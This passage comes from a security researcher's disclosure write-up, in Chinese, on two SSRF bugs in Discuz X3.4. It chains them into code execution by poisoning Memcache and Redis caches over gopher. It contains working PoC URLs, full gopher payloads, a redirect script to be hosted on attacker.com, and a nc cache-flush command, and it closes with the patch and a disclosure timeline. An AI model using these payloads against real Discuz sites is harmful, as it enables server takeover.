&lt;a href=&quot;https://bugs.php.net/bug.php?id=73192&quot;&gt;https://bugs.php.net/bug.php?id=73192&lt;/a&gt; ），及利用 &lt;code class=&quot;inline&quot;&gt;parse_url&lt;/code&gt; 和 curl 对 url 的解析差异，成功进行 302 跳转到任意恶意地址，最后再 302 跳转到 gopher 就做到发送任意数据包。详情可以参考 l3m0n 的博客：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/iamstudy/articles/discuz_x34_ssrf_1.html&quot;&gt;Discuz x3.4前台SSRF - l3m0n - 博客园&lt;/a&gt;&lt;/p&gt;&lt;p&gt;但是这种利用方式对 PHP、curl 版本都有特殊的要求，而且要服务端环境接受空 Host 的请求。总的来说，imgcropper SSRF 仍然比较鸡肋。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Weixin Plugin SSRF&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;source/plugin/wechat/wechat.class.php&lt;/code&gt; &lt;code class=&quot;inline&quot;&gt;WeChat&lt;/code&gt;类&lt;code class=&quot;inline&quot;&gt;syncAvatar&lt;/code&gt;方法：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    static public function syncAvatar($uid, $avatar) {

        if(!$uid || !$avatar) {
            return false;
        }

        if(!$content = dfsockopen($avatar)) {
            return false;
        }

        $tmpFile = DISCUZ_ROOT.&#39;./data/avatar/&#39;.TIMESTAMP.random(6);
        file_put_contents($tmpFile, $content);

        if(!is_file($tmpFile)) {
            return false;
        }

        $result = uploadUcAvatar::upload($uid, $tmpFile);
        unlink($tmpFile);

        C::t(&#39;common_member&#39;)-&amp;gt;update($uid, array(&#39;avatarstatus&#39;=&amp;gt;&#39;1&#39;));

        return $result;
    }&lt;/code&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;source/plugin/wechat/wechat.inc.php&lt;/code&gt; 中调用了&lt;code class=&quot;inline&quot;&gt;WeChat::syncAvatar&lt;/code&gt;，直接用&lt;code class=&quot;inline&quot;&gt;$_GET[&#39;avatar&#39;]&lt;/code&gt;作为参数传进去：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;......

elseif(($ac == &#39;register&#39; &amp;amp;&amp;amp; submitcheck(&#39;submit&#39;) || $ac == &#39;wxregister&#39;) &amp;amp;&amp;amp; $_G[&#39;wechat&#39;][&#39;setting&#39;][&#39;wechat_allowregister&#39;]) {

        ......

        $uid = WeChat::register($_GET[&#39;username&#39;], $ac == &#39;wxregister&#39;);

        if($uid &amp;amp;&amp;amp; $_GET[&#39;avatar&#39;]) {
            WeChat::syncAvatar($uid, $_GET[&#39;avatar&#39;]);
        }

}&lt;/code&gt;&lt;p&gt;不过因为这里用到了微信登录的插件，所以要利用的话需要目标站开启微信登录：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-92f7c79bdd080b925a61f3d9dfdc303b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1664&quot; data-rawheight=&quot;626&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-92f7c79bdd080b925a61f3d9dfdc303b&quot; data-watermark-src=&quot;v2-6f876f9bceda4185e091e5e9e575051d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这里 SSRF 的构造很简单，直接在&lt;code class=&quot;inline&quot;&gt;avatar&lt;/code&gt;参数构造 url 即可（只是注意&lt;code class=&quot;inline&quot;&gt;wxopenid&lt;/code&gt;参数每次请求都要足够随机保证没有重复，如果重复的话代码是无法走到发起请求的逻辑的）：&lt;/p&gt;&lt;p&gt;poc:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://target/plugin.php?id=wechat:wechat&amp;amp;ac=wxregister&amp;amp;username=vov&amp;amp;avatar=http://localhost:9090/dz-weixin-plugin-ssrf&amp;amp;wxopenid=dont_be_evil&lt;/code&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-191979a78babc6dbbaba9dd357fb1b32_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1332&quot; data-rawheight=&quot;382&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-191979a78babc6dbbaba9dd357fb1b32&quot; data-watermark-src=&quot;v2-418abb5681a74804c21c23aea28940b1&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Dz SSRF getshell&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;乌云关闭前 Jannock 给 Dz 交过需要一定条件命令执行的漏洞，当时由于漏洞还未公开乌云就已关闭所以具体的细节我已不得而知。不过我后来从网上各处搜罗查找资料，发现 chengable 写的一篇分析那个漏洞文章：&lt;a href=&quot;http://chengable.net/index.php/archives/46/&quot;&gt;discuz利用ssrf+缓存应用getshell漏洞分析 - CHENGABLE BLOG&lt;/a&gt; ，从而知道是用 SSRF 篡改缓存从而 getshell。本着学习的态度，我搭环境调试了这个精彩的漏洞利用方式，并且发现除了 Redis，攻击 Memcache 也是可以的，只不过要多踩一个坑。&lt;/p&gt;&lt;p&gt;先说结论：Dz 由 &lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt; 函数导致的 SSRF，如果要 getshell，目标站需要满足以下几个条件：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;服务端 PHP 环境安装有 curl 扩展（为了通过 curl 使用 gopher 协议）&lt;/li&gt;&lt;li&gt;使用 Memcache 或未设置密码认证的 Redis 进行缓存&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;由于 imgcropper SSRF 利用限制较多，所以这里我用 Weixin Plugin SSRF进行演示。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;SSRF 攻击 Memcache&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Dz 整合 Memcache 配置成功后，默认情况下网站首页右下角会出现&lt;code class=&quot;inline&quot;&gt;MemCache On&lt;/code&gt;的标志：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9a09681c05a0d2850344cbf3afe7ce76_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;814&quot; data-rawheight=&quot;98&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;Dz 在安装的时候，对于缓存中的键名加了随机字符串作为前缀。所以如果 SSRF 要攻击 Memcache ，第一个问题是，如何找到正确的键名？&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;install/index.php&lt;/code&gt; 345-357行：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;        $uid = DZUCFULL ? 1 : $adminuser[&#39;uid&#39;];
        $authkey = md5($_SERVER[&#39;SERVER_ADDR&#39;].$_SERVER[&#39;HTTP_USER_AGENT&#39;].$dbhost.$dbuser.$dbpw.$dbname.$username.$password.$pconnect.substr($timestamp, 0, 8)).random(18);
        $_config[&#39;db&#39;][1][&#39;dbhost&#39;] = $dbhost;
        $_config[&#39;db&#39;][1][&#39;dbname&#39;] = $dbname;
        $_config[&#39;db&#39;][1][&#39;dbpw&#39;] = $dbpw;
        $_config[&#39;db&#39;][1][&#39;dbuser&#39;] = $dbuser;
        $_config[&#39;db&#39;][1][&#39;tablepre&#39;] = $tablepre;
        $_config[&#39;admincp&#39;][&#39;founder&#39;] = (string)$uid;
        $_config[&#39;security&#39;][&#39;authkey&#39;] = $authkey;
        $_config[&#39;cookie&#39;][&#39;cookiepre&#39;] = random(4).&#39;_&#39;;
        $_config[&#39;memory&#39;][&#39;prefix&#39;] = random(6).&#39;_&#39;;

        save_config_file(ROOT_PATH.CONFIG, $_config, $default_config);&lt;/code&gt;&lt;p&gt;这是 Dz 在安装的时候的一段代码，这段代码设置了 authkey、Cookie 前缀以及缓存键名前缀，其中用到了&lt;code class=&quot;inline&quot;&gt;random&lt;/code&gt;函数生成随机字符串。所以跟进这个&lt;code class=&quot;inline&quot;&gt;random&lt;/code&gt;：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;function random($length) {
    $hash = &#39;&#39;;
    $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;;
    $max = strlen($chars) - 1;
    PHP_VERSION &amp;lt; &#39;4.2.0&#39; &amp;amp;&amp;amp; mt_srand((double)microtime() * 1000000);
    for($i = 0; $i &amp;lt; $length; $i++) {
        $hash .= $chars[mt_rand(0, $max)];
    }
    return $hash;
}&lt;/code&gt;&lt;p&gt;可以发现，如果 PHP 版本大于 4.2.0，那么 &lt;code class=&quot;inline&quot;&gt;mt_rand&lt;/code&gt; 随机数的种子是不变的。也就是说，生成 authkey、Cookie 前缀以及缓存键名前缀时调用的 &lt;code class=&quot;inline&quot;&gt;mt_rand&lt;/code&gt; 用的都是同一个种子，而 Cookie 前缀是已知的，通过观察 HTTP 请求就可以知道。因此，随机数播种的种子可以被缩到一个极小的范围内进行猜解。这里可以用 &lt;a href=&quot;http://www.openwall.com/php_mt_seed/README&quot;&gt;php_mt_seed&lt;/a&gt; 进行种子爆破。&lt;/p&gt;&lt;p&gt;通过 &lt;code class=&quot;inline&quot;&gt;mt_rand&lt;/code&gt; 种子的猜解，缓存键名前缀的可能性从 62^6 缩小到不到 1000 个，这就完全属于可以爆破的范畴了。对猜解出来的所有可能的缓存键名前缀分别构造 SSRF 请求发送到服务器，最后即能更改某一键名对应的键值。&lt;/p&gt;&lt;p&gt;Memcache 缓存键名的问题解决了，接下来的问题是，缓存数据被加载到哪了？如何通过修改缓存数据来 getshell？&lt;/p&gt;&lt;p&gt;这一部分的思路就可以直接参照 chengable 写的那篇文章了，&lt;code class=&quot;inline&quot;&gt;output_replace&lt;/code&gt; 函数细节有略微变化，但大体思路是一致的，所以我也不再赘述了。&lt;/p&gt;&lt;p&gt;最后准备用 gopher 协议构造 SSRF 的 payload。写这样一段代码（先假设缓存键名前缀是 &lt;code class=&quot;inline&quot;&gt;IwRW7l&lt;/code&gt;）:&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;&amp;lt;?php

$_G[&#39;setting&#39;][&#39;output&#39;][&#39;preg&#39;][&#39;search&#39;][&#39;plugins&#39;] = &#39;/.*/&#39;;
$_G[&#39;setting&#39;][&#39;output&#39;][&#39;preg&#39;][&#39;replace&#39;][&#39;plugins&#39;] = &#39;phpinfo()&#39;;
$_G[&#39;setting&#39;][&#39;rewritestatus&#39;] = 1;

$memcache = new Memcache;
$memcache-&amp;gt;connect(&#39;localhost&#39;, 11211) or die (&quot;Could not connect&quot;);
$memcache-&amp;gt;set(&#39;IwRW7l_setting&#39;, $_G[&#39;setting&#39;]);&lt;/code&gt;&lt;p&gt;运行这段 PHP 代码，同时抓包，然后将数据包改成 gopher 的形式，即：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;gopher://localhost:11211/_set%20IwRW7l_setting%201%200%20161%0d%0aa%3A2%3A%7Bs%3A6%3A%22output%22%3Ba%3A1%3A%7Bs%3A4%3A%22preg%22%3Ba%3A2%3A%7Bs%3A6%3A%22search%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A4%3A%22%2F.*%2F%22%3B%7Ds%3A7%3A%22replace%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A9%3A%22phpinfo()%22%3B%7D%7D%7Ds%3A13%3A%22rewritestatus%22%3Bi%3A1%3B%7D&lt;/code&gt;&lt;p&gt;但是直接用它去 SSRF 是不可以的，会被&lt;code class=&quot;inline&quot;&gt;_xss_check&lt;/code&gt;检测到特殊字符而被拒绝请求：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-89e49e7e6e1b503f37268926e59fa072_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2094&quot; data-rawheight=&quot;966&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-89e49e7e6e1b503f37268926e59fa072&quot; data-watermark-src=&quot;v2-73b6cedf186352e00466852500931c0c&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;所以利用这里请求跟随跳转的特点，在自己的远程服务器上放类似于这样的一个脚本：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;?php

$url = base64_decode($_REQUEST[&#39;url&#39;]);
header( &quot;Location: &quot; . $url );&lt;/code&gt;&lt;p&gt;这样就可以将 SSRF URL 进行 base64 编码从而规避&lt;code class=&quot;inline&quot;&gt;_xss_check&lt;/code&gt;的检测。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://target/plugin.php?id=wechat:wechat&amp;amp;ac=wxregister&amp;amp;username=vov&amp;amp;avatar=http%3A%2F%2Fattacker.com%2F302.php%3Furl%3DZ29waGVyOi8vbG9jYWxob3N0OjExMjExL19zZXQlMjBJd1JXN2xfc2V0dGluZyUyMDElMjAwJTIwMTYxJTBkJTBhYSUzQTIlM0ElN0JzJTNBNiUzQSUyMm91dHB1dCUyMiUzQmElM0ExJTNBJTdCcyUzQTQlM0ElMjJwcmVnJTIyJTNCYSUzQTIlM0ElN0JzJTNBNiUzQSUyMnNlYXJjaCUyMiUzQmElM0ExJTNBJTdCcyUzQTclM0ElMjJwbHVnaW5zJTIyJTNCcyUzQTQlM0ElMjIlMkYuKiUyRiUyMiUzQiU3RHMlM0E3JTNBJTIycmVwbGFjZSUyMiUzQmElM0ExJTNBJTdCcyUzQTclM0ElMjJwbHVnaW5zJTIyJTNCcyUzQTklM0ElMjJwaHBpbmZvKCklMjIlM0IlN0QlN0QlN0RzJTNBMTMlM0ElMjJyZXdyaXRlc3RhdHVzJTIyJTNCaSUzQTElM0IlN0Q%253D&amp;amp;wxopenid=xxxyyy&lt;/code&gt;&lt;p&gt;再访问&lt;code class=&quot;inline&quot;&gt;/forum.php?mod=ajax&amp;amp;action=getthreadtypes&amp;amp;inajax=yes&lt;/code&gt;，即可看到&lt;code class=&quot;inline&quot;&gt;phpinfo()&lt;/code&gt;代码已被执行：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ca0244ee736f19d51caedfdf36004da7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2582&quot; data-rawheight=&quot;1462&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-ca0244ee736f19d51caedfdf36004da7&quot; data-watermark-src=&quot;v2-61894903db5590c7c8c1251e4b498219&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;由于缓存被暴力篡改，会导致网站无法正常运行。恢复正常办法是刷新缓存。用上面的思路直接一次 getshell 后执行以下命令，网站就可以恢复正常：&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;echo -e &#39;flush_all&#39; | nc localhost 11211&lt;/code&gt;&lt;p&gt;最后我写了个将上述整个过程自动化 getshell 的脚本：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3952b1f9cbacc62cbc64ca197b23983c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1200&quot; data-rawheight=&quot;514&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-3952b1f9cbacc62cbc64ca197b23983c&quot; data-watermark-src=&quot;v2-5dc509a6ec888cb6faecc0f2d1987412&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3ff111646ab29d28ca0e83dfa1359515_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;580&quot; data-rawheight=&quot;380&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-3ff111646ab29d28ca0e83dfa1359515&quot; data-watermark-src=&quot;v2-405577e479bdba8da2c9dce19e91feff&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;SSRF 攻击 Redis&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类似地，Dz 整合 Redis 配置成功后，默认情况下网站首页右下角会出现&lt;code class=&quot;inline&quot;&gt;Redis On&lt;/code&gt;的标志：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-38b8351402d3faa4c921b20723838c3d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;796&quot; data-rawheight=&quot;114&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;SSRF 攻击 Redis 步骤实际上就比攻击 Memcache 简单了，因为 Redis 支持 lua 脚本，可以直接用 lua 脚本获取缓存键名而无需再去猜解前缀。当然能成功攻击的前提是 Redis 没有配置密码认证，Discuz requirepass 那一项为空：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-33cd4ccebce220760348de8419512b17_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;724&quot; data-rawheight=&quot;220&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-33cd4ccebce220760348de8419512b17&quot; data-watermark-src=&quot;v2-dc5956c6a43821a0a6383d62f810ef58&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;Redis 交互命令行执行 lua 脚本：&lt;/p&gt;&lt;code lang=&quot;lua&quot;&gt;eval &quot;local t=redis.call(&#39;keys&#39;,&#39;*_setting&#39;); for i,v in ipairs(t) do redis.call(&#39;set&#39;, v, &#39;a:2:{s:6:\&quot;output\&quot;;a:1:{s:4:\&quot;preg\&quot;;a:2:{s:6:\&quot;search\&quot;;a:1:{s:7:\&quot;plugins\&quot;;s:4:\&quot;/.*/\&quot;;}s:7:\&quot;replace\&quot;;a:1:{s:7:\&quot;plugins\&quot;;s:9:\&quot;phpinfo()\&quot;;}}}s:13:\&quot;rewritestatus\&quot;;i:1;}&#39;) end; return 1;&quot; 0&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d7dcf11173196ded7d866083ebf8019c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1434&quot; data-rawheight=&quot;180&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;同样地，对这个过程抓包，将数据包改成 gopher 的形式：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;gopher://localhost:6379/_*3%0d%0a%244%0d%0aeval%0d%0a%24264%0d%0alocal%20t%3Dredis.call(&#39;keys&#39;%2C&#39;*_setting&#39;)%3B%20for%20i%2Cv%20in%20ipairs(t)%20do%20redis.call(&#39;set&#39;%2C%20v%2C%20&#39;a%3A2%3A%7Bs%3A6%3A%22output%22%3Ba%3A1%3A%7Bs%3A4%3A%22preg%22%3Ba%3A2%3A%7Bs%3A6%3A%22search%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A4%3A%22%2F.*%2F%22%3B%7Ds%3A7%3A%22replace%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A9%3A%22phpinfo()%22%3B%7D%7D%7Ds%3A13%3A%22rewritestatus%22%3Bi%3A1%3B%7D&#39;)%20end%3B%20return%201%3B%0d%0a%241%0d%0a0%0d%0a&lt;/code&gt;&lt;p&gt;SSRF 利用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://target/plugin.php?id=wechat:wechat&amp;amp;ac=wxregister&amp;amp;username=vov&amp;amp;avatar=http%3A%2F%2Fattacker.com%2F302.php%3Furl%3DZ29waGVyOi8vbG9jYWxob3N0OjYzNzkvXyozJTBkJTBhJTI0NCUwZCUwYWV2YWwlMGQlMGElMjQyNjQlMGQlMGFsb2NhbCUyMHQlM0RyZWRpcy5jYWxsKCdrZXlzJyUyQycqX3NldHRpbmcnKSUzQiUyMGZvciUyMGklMkN2JTIwaW4lMjBpcGFpcnModCklMjBkbyUyMHJlZGlzLmNhbGwoJ3NldCclMkMlMjB2JTJDJTIwJ2ElM0EyJTNBJTdCcyUzQTYlM0ElMjJvdXRwdXQlMjIlM0JhJTNBMSUzQSU3QnMlM0E0JTNBJTIycHJlZyUyMiUzQmElM0EyJTNBJTdCcyUzQTYlM0ElMjJzZWFyY2glMjIlM0JhJTNBMSUzQSU3QnMlM0E3JTNBJTIycGx1Z2lucyUyMiUzQnMlM0E0JTNBJTIyJTJGLiolMkYlMjIlM0IlN0RzJTNBNyUzQSUyMnJlcGxhY2UlMjIlM0JhJTNBMSUzQSU3QnMlM0E3JTNBJTIycGx1Z2lucyUyMiUzQnMlM0E5JTNBJTIycGhwaW5mbygpJTIyJTNCJTdEJTdEJTdEcyUzQTEzJTNBJTIycmV3cml0ZXN0YXR1cyUyMiUzQmklM0ExJTNCJTdEJyklMjBlbmQlM0IlMjByZXR1cm4lMjAxJTNCJTBkJTBhJTI0MSUwZCUwYTAlMGQlMGE%253D&amp;amp;wxopenid=xxxyyyzzz&lt;/code&gt;&lt;p&gt;代码即再次执行成功。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;修复补丁&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/41eb5bb0a3a716f84b0ce4e4feb41e6f25a980a3&quot;&gt;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/41eb5bb0a3a716f84b0ce4e4feb41e6f25a980a3&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Dz 参照了 WordPress 中的做法，对 url 的请求协议、端口做了白名单检查，并限制了请求 IP 地址不能为除了 localhost 以外的其他内网段地址，更重要的是不再跟随跳转。因此无法再通过 SSRF 利用 gopher 协议攻击 Dz 的缓存服务了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;时间线&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;2018/03/23：向 TSRC 报告两处 SSRF&lt;/li&gt;&lt;li&gt;2018/03/26：TSRC 确认漏洞存在，并准备进行漏洞修复&lt;/li&gt;&lt;li&gt;2018/04/09 - 2018/08/01：协助 TSRC 进行漏洞修复&lt;/li&gt;&lt;li&gt;2018/11/06：DiscuzX 在 gitee 上提交补丁 commit&lt;/li&gt;&lt;li&gt;2018/12/09：公开漏洞详情&lt;/li&gt;&lt;/ul&gt;</description>
<author>voidfyoo</author>
<guid isPermaLink="false">2018-12-09-51907363</guid>
<pubDate>Sun, 09 Dec 2018 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
